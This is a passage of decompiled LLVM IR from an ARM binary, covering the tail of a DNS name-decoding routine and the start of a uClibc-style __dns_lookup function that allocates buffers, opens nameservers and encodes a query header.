  %v4_15a7853 = load i8, i8* %v3_15a7852, align 1
  %v6_15a7854 = zext i8 %v4_15a7853 to i32
  store i32 %v6_15a7854, i32* @r4, align 4
  %v2_15a7c55 = icmp eq i8 %v4_15a7853, 0
  br i1 %v2_15a7c55, label %bb49, label %dec_label_pc_15a84

dec_label_pc_15a6c:                               ; preds = %bb48, %bb44
  %v1_15a70 = phi i32 [ %v1_15a70.pre, %bb48 ], [ %v1_15a9c59, %bb44 ]
  %v0_15a70 = phi i32 [ %v0_15a70.pre, %bb48 ], [ %v5_15ab4, %bb44 ]
  %v0_15a6c = phi i32 [ %v0_15a6c.pre, %bb48 ], [ %v0_15ab860, %bb44 ]
  store i32 %v0_15a6c, i32* %r0.global-to-local, align 4
  %v6_15a74 = icmp slt i32 %v0_15a70, %v1_15a70
  br i1 %v6_15a74, label %dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge, label %dec_label_pc_15b30

dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge:  ; preds = %dec_label_pc_15a6c
  %v0_15a78.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_15a78 = add i32 %v0_15a78.pre, %v0_15a70
  %v3_15a78 = inttoptr i32 %v2_15a78 to i8*
  %v4_15a78 = load i8, i8* %v3_15a78, align 1
  %v6_15a78 = zext i8 %v4_15a78 to i32
  store i32 %v6_15a78, i32* @r4, align 4
  %v2_15a7c = icmp eq i8 %v4_15a78, 0
  %v0_15b1c = load i32, i32* @ip, align 4
  %v2_15b1c = icmp eq i32 %v0_15b1c, 0
  br i1 %v2_15a7c, label %dec_label_pc_15b1c, label %dec_label_pc_15a84

dec_label_pc_15a84:                               ; preds = %dec_label_pc_15a78.preheader, %dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge
  %v2_15b1c66 = phi i1 [ %v2_15b1c, %dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge ], [ false, %dec_label_pc_15a78.preheader ]
  %v0_15b1c64 = phi i32 [ %v0_15b1c, %dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge ], [ 1, %dec_label_pc_15a78.preheader ]
  %v6_15a7863 = phi i32 [ %v6_15a78, %dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge ], [ %v6_15a7854, %dec_label_pc_15a78.preheader ]
  %v0_15aa462 = phi i32 [ %v0_15a78.pre, %dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge ], [ %v0_15a48, %dec_label_pc_15a78.preheader ]
  %v0_15a9461 = phi i32 [ %v0_15a70, %dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge ], [ %v0_15a704, %dec_label_pc_15a78.preheader ]
  %v0_15ab860 = phi i32 [ %v0_15a6c, %dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge ], [ 0, %dec_label_pc_15a78.preheader ]
  %v1_15a9c59 = phi i32 [ %v1_15a70, %dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge ], [ %arg2, %dec_label_pc_15a78.preheader ]
  %v1_15a88 = and i32 %v6_15a7863, 192
  br i1 %v2_15b1c66, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_15a84
  %v1_15a8c = load i32, i32* %r8.global-to-local, align 4
  %v2_15a8c = add i32 %v1_15a8c, 1
  store i32 %v2_15a8c, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_15a84, %bb
  %v2_15a90 = icmp eq i32 %v1_15a88, 192
  %v1_15a94 = add i32 %v0_15a9461, 1
  store i32 %v1_15a94, i32* @r1, align 4
  br i1 %v2_15a90, label %dec_label_pc_15a9c, label %dec_label_pc_15ac4

dec_label_pc_15a9c:                               ; preds = %bb42
  %v6_15aa0 = icmp slt i32 %v1_15a94, %v1_15a9c59
  br i1 %v6_15aa0, label %dec_label_pc_15aa4, label %dec_label_pc_15b30

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a9c
  %v2_15aa4 = add i32 %v1_15a94, %v0_15aa462
  %v3_15aa4 = inttoptr i32 %v2_15aa4 to i8*
  %v4_15aa4 = load i8, i8* %v3_15aa4, align 1
  %v6_15aa4 = zext i8 %v4_15aa4 to i32
  %v1_15aac = urem i32 %v6_15a7863, 64
  br i1 %v2_15b1c66, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_15aa4
  %v1_15ab0 = load i32, i32* %r8.global-to-local, align 4
  %v2_15ab0 = add i32 %v1_15ab0, 1
  store i32 %v2_15ab0, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_15aa4, %bb43
  %v4_15ab4 = mul nuw nsw i32 %v1_15aac, 256
  %v5_15ab4 = or i32 %v6_15aa4, %v4_15ab4
  store i32 %v5_15ab4, i32* @r1, align 4
  store i32 %v0_15ab860, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_15a6c

dec_label_pc_15ac4:                               ; preds = %bb42
  %v2_15ac4 = add i32 %v6_15a7863, %v0_15ab860
  store i32 %v2_15ac4, i32* %r6.global-to-local, align 4
  %v3_15ac8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_15ac8, i32* @r3, align 4
  %v1_15acc = add i32 %v2_15ac4, 1
  store i32 %v1_15acc, i32* %r7.global-to-local, align 4
  %v3_15ad0 = icmp ult i32 %v1_15acc, %v3_15ac8
  br i1 %v3_15ad0, label %dec_label_pc_15ad8, label %dec_label_pc_15b30

dec_label_pc_15ad8:                               ; preds = %dec_label_pc_15ac4
  %v2_15ad8 = add i32 %v6_15a7863, %v1_15a94
  store i32 %v2_15ad8, i32* @r5, align 4
  %v3_15adc = icmp ult i32 %v2_15ad8, %v1_15a9c59
  br i1 %v3_15adc, label %dec_label_pc_15ae4, label %dec_label_pc_15b30

dec_label_pc_15ae4:                               ; preds = %dec_label_pc_15ad8
  %v2_15ae4 = add i32 %v1_15a94, %v0_15aa462
  store i32 %v2_15ae4, i32* @r1, align 4
  %v0_15ae8 = load i32, i32* %sb.global-to-local, align 4
  %v2_15ae8 = add i32 %v0_15ae8, %v0_15ab860
  store i32 %v2_15ae8, i32* @r0, align 4
  store i32 %v6_15a7863, i32* @r2, align 4
  %v0_15af4 = call i32 @memcpy()
  store i32 %v0_15af4, i32* %r0.global-to-local, align 4
  store i32 %v0_15b1c64, i32* @ip, align 4
  %v0_15afc = load i32, i32* %sl.global-to-local, align 4
  %v1_15afc = load i32, i32* @r5, align 4
  %v2_15afc = add i32 %v1_15afc, %v0_15afc
  %v3_15afc = inttoptr i32 %v2_15afc to i8*
  %v4_15afc = load i8, i8* %v3_15afc, align 1
  br i1 %v2_15b1c66, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_15ae4
  %v1_15b04 = load i32, i32* %r8.global-to-local, align 4
  %v2_15b04 = load i32, i32* @r4, align 4
  %v3_15b04 = add i32 %v2_15b04, %v1_15b04
  store i32 %v3_15b04, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_15ae4, %bb45
  %v2_15b08 = icmp eq i8 %v4_15afc, 0
  br i1 %v2_15b08, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_15b14.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_15afc, i32* @r1, align 4
  %v2_15b14 = load i32, i32* %sb.global-to-local, align 4
  %v3_15b14 = load i32, i32* %r6.global-to-local, align 4
  %v4_15b14 = add i32 %v3_15b14, %v2_15b14
  %v5_15b14 = inttoptr i32 %v4_15b14 to i8*
  store i8 %v0_15b14.off0, i8* %v5_15b14, align 1
  %v0_15a6c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_15a70.pre = load i32, i32* @r1, align 4
  %v1_15a70.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15a6c

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15a6c.dec_label_pc_15a78_crit_edge
  %v0_15b24.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_15b1c, label %dec_label_pc_15b30, label %bb49

bb49:                                             ; preds = %dec_label_pc_15a78.preheader, %dec_label_pc_15b1c
  %v0_15b24.pre69 = phi i32 [ %v0_15b24.pre.pre, %dec_label_pc_15b1c ], [ 0, %dec_label_pc_15a78.preheader ]
  %v2_15b20 = add i32 %v0_15b24.pre69, 1
  store i32 %v2_15b20, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15b30

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15ad8, %dec_label_pc_15ac4, %dec_label_pc_15a9c, %dec_label_pc_15a6c, %dec_label_pc_15b1c, %dec_label_pc_15a70.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_15b20, %bb49 ], [ -1, %dec_label_pc_15a70.preheader ], [ %v0_15b24.pre.pre, %dec_label_pc_15b1c ], [ -1, %dec_label_pc_15ac4 ], [ -1, %dec_label_pc_15ad8 ], [ -1, %dec_label_pc_15a6c ], [ -1, %dec_label_pc_15a9c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_15a44, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_15b24.pre.pre, { 1, 0 }
  uselistorder i32 %v1_15afc, { 1, 0 }
  uselistorder i32 %v5_15ab4, { 1, 0 }
  uselistorder i32 %v1_15a94, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_15ab860, { 3, 2, 0, 1 }
  uselistorder i32 %v6_15a7863, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_15b1c66, { 1, 2, 0 }
  uselistorder i32 %v0_15a48, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 3, 4, 1, 2 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_15b30, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_15a84, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp148 = call i32 @__decompiler_undefined_function_0()
  %tmp163 = call i32 @__decompiler_undefined_function_0()
  %tmp164 = call i32 @__decompiler_undefined_function_0()
  %tmp165 = call i32 @__decompiler_undefined_function_0()
  %tmp176 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_15b3c = load i32, i32* @r4, align 4
  %v6_15b3c = load i32, i32* @r5, align 4
  %v9_15b3c = load i32, i32* @r6, align 4
  %v12_15b3c = load i32, i32* @r7, align 4
  %v15_15b3c = load i32, i32* @r8, align 4
  %v18_15b3c = load i32, i32* @sb, align 4
  %v21_15b3c = load i32, i32* @sl, align 4
  %v24_15b3c = load i32, i32* @fp, align 4
  %v27_15b3c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @sb, align 4
  %v0_15b50 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b58 = call i32 @malloc(i32 512)
  store i32 %v1_15b58, i32* @sl, align 4
  %v0_15b60 = load i32, i32* @r4, align 4
  %v1_15b60 = inttoptr i32 %v0_15b60 to i8*
  %v3_15b64 = call i32 @strlen(i8* %v1_15b60)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_15b70 = icmp ugt i32 %v3_15b64, 893
  store i1 %v3_15b70, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r8, align 4
  %tmp288 = icmp ugt i32 %v3_15b64, 894
  br i1 %tmp288, label %.thread134, label %dec_label_pc_15b90

.thread134:                                       ; preds = %entry
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_162b4

dec_label_pc_15b90:                               ; preds = %entry
  store i32 %v3_15b64, i32* %r2.global-to-local, align 4
  %v1_15b94 = add i32 %v3_15b64, 130
  %v1_15b98 = call i32 @malloc(i32 %v1_15b94)
  store i32 %v1_15b98, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15b9c = icmp eq i32 %v1_15b98, 0
  br i1 %v2_15b9c, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_15b90
  %v1_15ba0 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_15ba0 = icmp eq i32 %v1_15ba0, 0
  br i1 %v3_15ba0, label %bb217, label %dec_label_pc_15bb4

.thread6:                                         ; preds = %dec_label_pc_15b90
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_162ac

bb217:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_162ac

dec_label_pc_15bb4:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_15bb4 = load i32, i32* @r4, align 4
  %v1_15bb4 = inttoptr i32 %v0_15bb4 to i8*
  %v2_15bb4 = load i8, i8* %v1_15bb4, align 1
  %v3_15bb4 = zext i8 %v2_15bb4 to i32
  store i32 %v3_15bb4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15bb8 = icmp eq i8 %v2_15bb4, 0
  br i1 %v2_15bb8, label %dec_label_pc_162ac, label %dec_label_pc_15bc0

dec_label_pc_15bc0:                               ; preds = %dec_label_pc_15bb4
  %v2_15bc4 = add i32 %v0_15bb4, %v3_15b64
  store i32 %v2_15bc4, i32* %r3.global-to-local, align 4
  %v1_15bc8 = add i32 %v2_15bc4, -1
  %v2_15bc8 = inttoptr i32 %v1_15bc8 to i8*
  %v3_15bc8 = load i8, i8* %v2_15bc8, align 1
  %v4_15bc8 = zext i8 %v3_15bc8 to i32
  store i32 %v4_15bc8, i32* @r3, align 4
  store i32 %v3_15b64, i32* @r2, align 4
  store i32 %v0_15bb4, i32* @r1, align 4
  %v0_15bd8 = call i32 @memcpy()
  store i32 14428, i32* %r3.global-to-local, align 4
  store i32 13320, i32* %r1.global-to-local, align 4
  store i32 819, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v2_15c50 = ptrtoint i32* %stack_var_-76 to i32
  %v2_15d60 = ptrtoint i16* %stack_var_-104 to i32
  %v2_15d88 = ptrtoint i32* %stack_var_-192 to i32
  %v3_15da8 = bitcast i32* %stack_var_-192 to i8*
  %v2_15e5c = ptrtoint i32* %stack_var_-48 to i32
  %v2_15ef4 = icmp eq i32 %tmp165, 0
  %v1_15f00 = add i32 %tmp164, -2
  %v2_15f04 = icmp ne i32 %v1_15f00, 0
  %tmp218 = icmp slt i32 %tmp163, 1
  %v2_16000 = ptrtoint i32* %stack_var_-448 to i32
  %v2_16004 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1625857 = icmp sgt i32 %tmp163, 0
  %v2_16180 = icmp ne i32 %v0_15b50, 0
  %v7_16180 = icmp eq i32 %v0_15b50, 1
  %v1_16068 = bitcast i32* %stack_var_-448 to i8*
  %v2_1611c = icmp eq i32 %tmp148, 0
  %v2_15f10 = icmp ugt i8 %v3_15bc8, 45
  %v7_15f10 = icmp eq i8 %v3_15bc8, 46
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_15ca4 = add i32 %v1_15b98, %v3_15b64
  %v5_15ca4 = inttoptr i32 %v4_15ca4 to i8*
  %v1_15f00.cmp = icmp ugt i32 %v1_15f00, 1
  %v2_15f40 = icmp eq i32 %tmp164, 0
  %v3_16184 = icmp ugt i32 %v0_15b50, 27
  %v8_16184 = icmp eq i32 %v0_15b50, 28
  br label %dec_label_pc_15c34

dec_label_pc_15c34:                               ; preds = %dec_label_pc_16294, %dec_label_pc_15bc0
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_15bc0 ], [ %v1_16298, %dec_label_pc_16294 ]
  %stack_var_-464.0 = phi i32 [ %tmp176, %dec_label_pc_15bc0 ], [ %v3_15d40, %dec_label_pc_16294 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_15bc0 ], [ %stack_var_-468.2, %dec_label_pc_16294 ]
  %v1_15c3c = phi i32 [ -1, %dec_label_pc_15bc0 ], [ %v3_15e14, %dec_label_pc_16294 ]
  store i32 %v1_15c3c, i32* %r3.global-to-local, align 4
  %v2_15c38 = icmp eq i32 %v1_15c3c, -1
  store i1 %v2_15c38, i1* %cpsr_c.global-to-local, align 1
  %v7_15c38 = icmp eq i32 %v1_15c3c, -1
  br i1 %v7_15c38, label %bb220, label %bb219

bb219:                                            ; preds = %dec_label_pc_15c34
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_15c34, %bb219
  %v1_15c40 = xor i1 %v7_15c38, true
  call void @__pseudo_cond_branch(i1 %v1_15c40, i32 ptrtoint (i32* @global_var_110a0.631 to i32))
  %v0_15c4c = load i32, i32* @r8, align 4
  %v2_15c4c = add i32 %v0_15c4c, 76
  %v3_15c4c = inttoptr i32 %v2_15c4c to i32*
  %v4_15c4c = load i32, i32* %v3_15c4c, align 4
  store i32 %v4_15c4c, i32* @r4, align 4
  store i32 %v2_15c50, i32* @r5, align 4
  %v2_15c54 = add i32 %v0_15c4c, 72
  %v3_15c54 = inttoptr i32 %v2_15c54 to i32*
  %v4_15c54 = load i32, i32* %v3_15c54, align 4
  store i32 %v4_15c54, i32* %r1.global-to-local, align 4
  store i32 %v4_15c4c, i32* %r2.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_15c64 = add i32 %v0_15c4c, 120
  %v3_15c64 = inttoptr i32 %v2_15c64 to i32*
  %v4_15c64 = load i32, i32* %v3_15c64, align 4
  call void @__pseudo_branch(i32 %v4_15c64)
  %v0_15c78 = load i32, i32* @r8, align 4
  %v2_15c78 = add i32 %v0_15c78, 16
  %v3_15c78 = inttoptr i32 %v2_15c78 to i32*
  %v4_15c78 = load i32, i32* %v3_15c78, align 4
  store i32 89220, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15c78)
  %v0_15c84 = call i32 @__open_nameservers()
  %v0_15c8c = load i32, i32* @r8, align 4
  %v2_15c8c = add i32 %v0_15c8c, 14428
  %v3_15c8c = inttoptr i32 %v2_15c8c to i32*
  %v4_15c8c = load i32, i32* %v3_15c8c, align 4
  store i32 %v1_15b98, i32* %r1.global-to-local, align 4
  store i32 %v3_15b64, i32* %r2.global-to-local, align 4
  store i32 0, i32* @fp, align 4
  %v0_15c9c = load i32, i32* @r7, align 4
  %v3_15c9c = icmp uge i32 %v0_15c9c, %v4_15c8c
  store i1 %v3_15c9c, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_15ca4, align 1
  %v0_15ca8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15ca8, label %dec_label_pc_15ccc, label %dec_label_pc_15cac

dec_label_pc_15cac:                               ; preds = %bb220
  store i32 46, i32* %r3.global-to-local, align 4
  %v2_15cb0 = load i32, i32* %r1.global-to-local, align 4
  %v3_15cb0 = load i32, i32* %r2.global-to-local, align 4
  %v4_15cb0 = add i32 %v3_15cb0, %v2_15cb0
  %v5_15cb0 = inttoptr i32 %v4_15cb0 to i8*
  store i8 46, i8* %v5_15cb0, align 1
  %v0_15cb8 = load i32, i32* @r8, align 4
  %v2_15cb8 = add i32 %v0_15cb8, 14416
  %v3_15cb8 = inttoptr i32 %v2_15cb8 to i32*
  %v4_15cb8 = load i32, i32* %v3_15cb8, align 4
  store i32 %v4_15cb8, i32* %r3.global-to-local, align 4
  %v0_15cbc = load i32, i32* %r1.global-to-local, align 4
  %v1_15cbc = add i32 %v0_15cbc, 1
  %v1_15cc0 = load i32, i32* %r2.global-to-local, align 4
  %v2_15cc0 = add i32 %v1_15cbc, %v1_15cc0
  %v1_15cc4 = load i32, i32* @r7, align 4
  %v2_15cc4 = and i32 %v1_15cc4, 1073741824
  %v3_15cc4 = icmp ne i32 %v2_15cc4, 0
  store i1 %v3_15cc4, i1* %cpsr_c.global-to-local, align 1
  %v4_15cc4 = mul i32 %v1_15cc4, 4
  %v5_15cc4 = add i32 %v4_15cc4, %v4_15cb8
  %v6_15cc4 = inttoptr i32 %v5_15cc4 to i32*
  %v7_15cc4 = load i32, i32* %v6_15cc4, align 4
  store i32 %v7_15cc4, i32* @r1, align 4
  %v2_15cc8 = inttoptr i32 %v2_15cc0 to i8*
  %v3_15cc8 = call i32 @strcpy(i8* %v2_15cc8, i32 %v7_15cc4)
  br label %dec_label_pc_15ccc

dec_label_pc_15ccc:                               ; preds = %bb220, %dec_label_pc_15cac
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15cd0 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_15cd0, label %dec_label_pc_15cd8, label %dec_label_pc_15ccc.dec_label_pc_15d08_crit_edge

dec_label_pc_15ccc.dec_label_pc_15d08_crit_edge:  ; preds = %dec_label_pc_15ccc
  %v0_15d10.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_15d08

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15ccc
  store i32 14424, i32* %r3.global-to-local, align 4
  store i32 819, i32* %r1.global-to-local, align 4
  %v0_15ce0 = load i32, i32* @r8, align 4
  %v2_15ce0 = add i32 %v0_15ce0, 14424
  %v3_15ce0 = inttoptr i32 %v2_15ce0 to i32*
  %v4_15ce0 = load i32, i32* %v3_15ce0, align 4
  store i32 %v4_15ce0, i32* %r2.global-to-local, align 4
  %v2_15ce4 = add i32 %v0_15ce0, 819
  %v3_15ce4 = inttoptr i32 %v2_15ce4 to i8*
  %v4_15ce4 = load i8, i8* %v3_15ce4, align 1
  %v6_15ce4 = zext i8 %v4_15ce4 to i32
  %v2_15ce8 = mul i32 %v6_15ce4, %v4_15ce0
  store i32 816, i32* %r2.global-to-local, align 4
  store i32 13320, i32* %r3.global-to-local, align 4
  %v2_15cf8 = add i32 %v0_15ce0, 816
  %v3_15cf8 = inttoptr i32 %v2_15cf8 to i16*
  %v4_15cf8 = load i16, i16* %v3_15cf8, align 2
  %v6_15cf8 = zext i16 %v4_15cf8 to i32
  store i32 %v6_15cf8, i32* %r2.global-to-local, align 4
  %v2_15cfc = add i32 %v0_15ce0, 13320
  %v3_15cfc = inttoptr i32 %v2_15cfc to i32*
  %v4_15cfc = load i32, i32* %v3_15cfc, align 4
  store i32 %v4_15cfc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d08

dec_label_pc_15d08:                               ; preds = %dec_label_pc_15ccc.dec_label_pc_15d08_crit_edge, %dec_label_pc_15cd8
  %v2_15d4c = phi i32 [ %v0_15ce0, %dec_label_pc_15cd8 ], [ %v0_15d10.pre, %dec_label_pc_15ccc.dec_label_pc_15d08_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_15cf8, %dec_label_pc_15cd8 ], [ %stack_var_-464.0, %dec_label_pc_15ccc.dec_label_pc_15d08_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_15cfc, %dec_label_pc_15cd8 ], [ %stack_var_-468.0, %dec_label_pc_15ccc.dec_label_pc_15d08_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_15ce8, %dec_label_pc_15cd8 ], [ %stack_var_-476.0, %dec_label_pc_15ccc.dec_label_pc_15d08_crit_edge ]
  store i32 14424, i32* %r3.global-to-local, align 4
  %v2_15d10 = add i32 %v2_15d4c, 14424
  %v3_15d10 = inttoptr i32 %v2_15d10 to i32*
  %v4_15d10 = load i32, i32* %v3_15d10, align 4
  store i32 %v4_15d10, i32* %r2.global-to-local, align 4
  store i32 14420, i32* %r3.global-to-local, align 4
  %v3_15d18 = icmp uge i32 %stack_var_-468.1, %v4_15d10
  store i1 %v3_15d18, i1* %cpsr_c.global-to-local, align 1
  %v2_15d1c = add i32 %v2_15d4c, 14420
  %v3_15d1c = inttoptr i32 %v2_15d1c to i32*
  %v4_15d1c = load i32, i32* %v3_15d1c, align 4
  store i32 %v4_15d1c, i32* %r3.global-to-local, align 4
  br i1 %v3_15d18, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_15d08
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_15d08, %bb221
  %v0_15d28 = phi i32 [ %stack_var_-468.1, %dec_label_pc_15d08 ], [ 0, %bb221 ]
  %v3_15d28 = mul i32 %v0_15d28, 28
  %v4_15d28 = add i32 %v3_15d28, %v4_15d1c
  store i32 %v4_15d28, i32* %r3.global-to-local, align 4
  %v1_15d34 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_15d40 = urem i32 %v1_15d34, 65536
  store i32 13320, i32* %r1.global-to-local, align 4
  %v1_15d4c = trunc i32 %v1_15d34 to i16
  %v4_15d4c = add i32 %v2_15d4c, 816
  %v5_15d4c = inttoptr i32 %v4_15d4c to i16*
  store i16 %v1_15d4c, i16* %v5_15d4c, align 2
  store i32 %v0_15d28, i32* %r2.global-to-local, align 4
  %v1_15d54 = load i32, i32* @r8, align 4
  %v2_15d54 = load i32, i32* %r1.global-to-local, align 4
  %v3_15d54 = add i32 %v2_15d54, %v1_15d54
  %v4_15d54 = inttoptr i32 %v3_15d54 to i32*
  store i32 %v0_15d28, i32* %v4_15d54, align 4
  %v0_15d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_15d5c = inttoptr i32 %v0_15d58 to i32*
  %v2_15d5c = load i32, i32* %v1_15d5c, align 4
  %v3_15d5c = add i32 %v0_15d58, 4
  %v4_15d5c = inttoptr i32 %v3_15d5c to i32*
  %v5_15d5c = load i32, i32* %v4_15d5c, align 4
  store i32 %v5_15d5c, i32* %r1.global-to-local, align 4
  %v6_15d5c = add i32 %v0_15d58, 8
  %v7_15d5c = inttoptr i32 %v6_15d5c to i32*
  %v8_15d5c = load i32, i32* %v7_15d5c, align 4
  store i32 %v8_15d5c, i32* %r2.global-to-local, align 4
  %v9_15d5c = add i32 %v0_15d58, 12
  %v10_15d5c = inttoptr i32 %v9_15d5c to i32*
  %v11_15d5c = load i32, i32* %v10_15d5c, align 4
  store i32 %v11_15d5c, i32* %r3.global-to-local, align 4
  %v4_15d64 = trunc i32 %v2_15d5c to i16
  store i16 %v4_15d64, i16* %stack_var_-104, align 2
  %v3_15d68 = add i32 %v0_15d58, 20
  %v4_15d68 = inttoptr i32 %v3_15d68 to i32*
  %v5_15d68 = load i32, i32* %v4_15d68, align 4
  store i32 %v5_15d68, i32* %r1.global-to-local, align 4
  %v6_15d68 = add i32 %v0_15d58, 24
  %v7_15d68 = inttoptr i32 %v6_15d68 to i32*
  %v8_15d68 = load i32, i32* %v7_15d68, align 4
  store i32 %v8_15d68, i32* %r2.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_15d7c = load i32, i32* @r8, align 4
  %v2_15d7c = add i32 %v0_15d7c, 48
  %v3_15d7c = inttoptr i32 %v2_15d7c to i32*
  %v4_15d7c = load i32, i32* %v3_15d7c, align 4
  store i32 89480, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15d7c)
  store i32 %v2_15d88, i32* @r6, align 4
  %v0_15d8c = load i32, i32* @fp, align 4
  store i32 %v0_15d8c, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  %v0_15d94 = load i32, i32* @sl, align 4
  %v3_15d98 = inttoptr i32 %v0_15d94 to i8*
  %v4_15d98 = call i32 @__GI_memset(i8* %v3_15d98, i32 %v0_15d8c, i32 512)
  %v0_15d9c = load i32, i32* @fp, align 4
  store i32 %v0_15d9c, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v4_15da8 = call i32 @__GI_memset(i8* %v3_15da8, i32 %v0_15d9c, i32 48)
  store i32 %v3_15d40, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_15db8 = load i32, i32* @sl, align 4
  store i32 %v0_15db8, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  store i32 %v3_15d40, i32* %stack_var_-192, align 4
  %v6_15dcc = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_15db8, i32 512, i32 %v3_15d40, i32 %v3_15d40)
  store i32 %v6_15dcc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15dd0 = icmp slt i32 %v6_15dcc, 0
  br i1 %v1_15dd0, label %dec_label_pc_162ac, label %dec_label_pc_15dd8

dec_label_pc_15dd8:                               ; preds = %bb222
